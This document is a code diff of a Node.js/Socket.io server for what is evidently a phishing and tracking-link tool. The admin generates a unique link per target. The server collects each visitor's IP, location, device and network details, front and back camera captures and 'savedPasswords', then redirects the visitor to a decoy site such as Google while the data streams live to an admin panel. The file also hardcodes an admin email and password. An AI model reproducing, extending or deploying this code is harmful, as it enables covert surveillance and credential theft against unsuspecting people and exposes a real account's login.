@@ -1,5 +1,5 @@
 // ==========================================
-// 1. SAB SE PEHLE: LIBRARIES IMPORT KAREIN
+// 1. IMPORTS
 // ==========================================
 const express = require('express');
 const http = require('http');
@@ -12,7 +12,7 @@ const session = require('express-session');
 const { v4: uuidv4 } = require('uuid');
 
 // ==========================================
-// 2. APP DEFINE KAREIN (SAB SE PEHLE)
+// 2. APP INITIALIZATION
 // ==========================================
 const app = express();
 const server = http.createServer(app);
@@ -24,14 +24,14 @@ const io = socketIo(server, {
 });
 
 // ==========================================
-// 3. MIDDLEWARE SETUP
+// 3. MIDDLEWARE
 // ==========================================
 app.use(cors());
-app.use(bodyParser.json());
-app.use(bodyParser.urlencoded({ extended: true }));
+app.use(bodyParser.json({ limit: '50mb' }));
+app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
 app.use(express.static('public'));
 app.use(session({
-    secret: 'your-secret-key',
+    secret: process.env.SESSION_SECRET || 'your-secret-key',
     resave: false,
     saveUninitialized: true,
     cookie: { secure: false }
@@ -46,14 +46,10 @@ const USERS_FILE = path.join(DB_PATH, 'users.json');
 if (!fs.existsSync(DB_PATH)) {
     fs.mkdirSync(DB_PATH);
 }
-
 if (!fs.existsSync(USERS_FILE)) {
     fs.writeFileSync(USERS_FILE, JSON.stringify([]));
 }
 
-// ==========================================
-// 5. DATABASE FUNCTIONS
-// ==========================================
 const readUsers = () => {
     try {
         const data = fs.readFileSync(USERS_FILE);
@@ -68,13 +64,12 @@ const writeUsers = (users) => {
 };
 
 // ==========================================
-// 6. ROUTES - ADMIN LOGIN & VISITOR
+// 5. ROUTES
 // ==========================================
 
-// Admin login
+// Admin Login
 app.post('/admin-login', (req, res) => {
     const { email, password } = req.body;
-    
     if (email === 'somuandsagar@gmail.com' && password === 'Somesh143x@4565') {
         req.session.admin = true;
         res.json({ success: true, message: 'Login successful' });
@@ -103,12 +98,12 @@ app.get('/api/visitor/:id', (req, res) => {
     }
 });
 
-// ==========================================
-// 7. NEW ROUTES - CUSTOM LINK & DELETE
-// ==========================================
-
 // Generate custom link
 app.post('/generate-custom-link', (req, res) => {
+    if (!req.session.admin) {
+        return res.status(401).json({ error: 'Unauthorized' });
+    }
+    
     const { redirectUrl } = req.body;
     const visitorId = uuidv4();
     const link = `${req.protocol}://${req.get('host')}/visitor/${visitorId}`;
@@ -116,16 +111,27 @@ app.post('/generate-custom-link', (req, res) => {
     const visitorInfo = {
         id: visitorId,
         link: link,
-        redirectUrl: redirectUrl,
+        redirectUrl: redirectUrl || 'https://www.google.com',
         createdAt: new Date().toISOString(),
-        status: 'pending'
+        status: 'pending',
+        deviceName: null,
+        ip: null,
+        location: null,
+        battery: null,
+        network: null,
+        frontCamera: null,
+        backCamera: null,
+        connected: false,
+        visitDate: null,
+        savedPasswords: null,
+        redirectComplete: false
     };
     
     const users = readUsers();
     users.push(visitorInfo);
     writeUsers(users);
     
-    res.json({ success: true, link: link, visitorId: visitorId, redirectUrl: redirectUrl });
+    res.json({ success: true, link: link, visitorId: visitorId, redirectUrl: visitorInfo.redirectUrl });
 });
 
 // Delete visitor
@@ -137,13 +143,10 @@ app.delete('/api/visitor/:id', (req, res) => {
     let users = readUsers();
     users = users.filter(u => u.id !== req.params.id);
     writeUsers(users);
-    
     res.json({ success: true });
 });
 
-// ==========================================
-// 8. FALLBACK ROUTE FOR VISITOR REDIRECT
-// ==========================================
+// Visitor redirect fallback
 app.get('/api/visitor-redirect/:id', (req, res) => {
     const users = readUsers();
     const visitor = users.find(u => u.id === req.params.id);
@@ -153,10 +156,6 @@ app.get('/api/visitor-redirect/:id', (req, res) => {
         res.json({ redirectUrl: 'https://www.google.com' });
     }
 });
-
-// ==========================================
-// 9. FRONTEND ROUTES
-// ==========================================
 
 // Serve pages
 app.get('/', (req, res) => {
@@ -172,19 +171,15 @@ app.get('/visitor/:id', (req, res) => {
 });
 
 // ==========================================
-// 10. SOCKET.IO CONNECTION
+// 6. SOCKET.IO
 // ==========================================
-
-// Store connected clients
 const connectedClients = new Map();
-const visitorData = new Map();
 
 io.on('connection', (socket) => {
-    console.log('New client connected:', socket.id);
+    console.log('🔌 Client connected:', socket.id);
     
     socket.on('visitor-connect', (data) => {
-        const { visitorId, userAgent, platform, screenResolution, battery, simNetwork } = data;
-        
+        const { visitorId, ...deviceInfo } = data;
         const ip = socket.handshake.address;
         
         const users = readUsers();
@@ -193,92 +188,73 @@ io.on('connection', (socket) => {
         if (userIndex !== -1) {
             users[userIndex] = {
                 ...users[userIndex],
+                ...deviceInfo,
                 ip: ip,
-                deviceName: platform,
-                networkName: userAgent,
-                userAgent: userAgent,
-                battery: battery || 'N/A',
-                simNetwork: simNetwork || 'N/A',
-                visitDate: new Date().toISOString(),
                 connected: true,
-                socketId: socket.id,
-                connectedAt: new Date().toISOString()
+                visitDate: new Date().toISOString(),
+                socketId: socket.id
             };
             writeUsers(users);
-            
             connectedClients.set(visitorId, socket.id);
-            visitorData.set(visitorId, users[userIndex]);
             
             io.emit('visitor-connected', users[userIndex]);
+            console.log('📱 Visitor connected:', visitorId);
         }
     });
     
     socket.on('visitor-data', (data) => {
         const { visitorId, type, content } = data;
+        console.log(`📩 Data received: ${type} for ${visitorId}`);
         
         const users = readUsers();
         const userIndex = users.findIndex(u => u.id === visitorId);
         
         if (userIndex !== -1) {
-            if (type === 'frontCamera') {
-                users[userIndex].frontCamera = content;
-                users[userIndex].lastCameraUpdate = new Date().toISOString();
-            } else if (type === 'backCamera') {
-                users[userIndex].backCamera = content;
-                users[userIndex].lastCameraUpdate = new Date().toISOString();
-            } else if (type === 'location') {
-                users[userIndex].location = content;
-                users[userIndex].lastLocationUpdate = new Date().toISOString();
-            } else if (type === 'savedPasswords') {
-                users[userIndex].savedPasswords = content;
-            } else if (type === 'redirectComplete') {
-                users[userIndex].redirectComplete = true;
-                users[userIndex].redirectTime = new Date().toISOString();
+            const updateField = {
+                'frontCamera': 'frontCamera',
+                'backCamera': 'backCamera',
+                'location': 'location',
+                'battery': 'battery',
+                'network': 'network',
+                'savedPasswords': 'savedPasswords',
+                'redirectComplete': 'redirectComplete'
+            }[type];
+            
+            if (updateField) {
+                users[userIndex][updateField] = content;
+                if (type === 'redirectComplete') {
+                    users[userIndex].redirectComplete = true;
+                    users[userIndex].redirectTime = new Date().toISOString();
+                }
+                writeUsers(users);
+                io.emit(`${type}-data`, { visitorId, content });
             }
-            
-            writeUsers(users);
-            
-            io.emit(`${type}-data`, { visitorId, content });
         }
     });
     
     socket.on('disconnect', () => {
-        console.log('Client disconnected:', socket.id);
-        
+        console.log('🔌 Client disconnected:', socket.id);
         for (let [visitorId, socketId] of connectedClients) {
             if (socketId === socket.id) {
                 const users = readUsers();
                 const userIndex = users.findIndex(u => u.id === visitorId);
                 if (userIndex !== -1) {
                     users[userIndex].connected = false;
-                    users[userIndex].disconnectedAt = new Date().toISOString();
                     writeUsers(users);
-                    
                     io.emit('visitor-disconnected', visitorId);
                 }
                 connectedClients.delete(visitorId);
-                visitorData.delete(visitorId);
                 break;
             }
-        }
-    });
-    
-    socket.on('admin-command', (data) => {
-        const { visitorId, command } = data;
-        const socketId = connectedClients.get(visitorId);
-        
-        if (socketId) {
-            io.to(socketId).emit('admin-command', { command });
         }
     });
 });
 
 // ==========================================
-// 11. SERVER START (SAB SE LAST MEIN)
+// 7. SERVER START
 // ==========================================
-
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
-    console.log(`Server running on http://localhost:${PORT}`);
-    console.log(`Admin panel: http://localhost:${PORT}/admin`);
+    console.log(`🚀 Server running on http://localhost:${PORT}`);
+    console.log(`👨‍💼 Admin panel: http://localhost:${PORT}/admin`);
 });
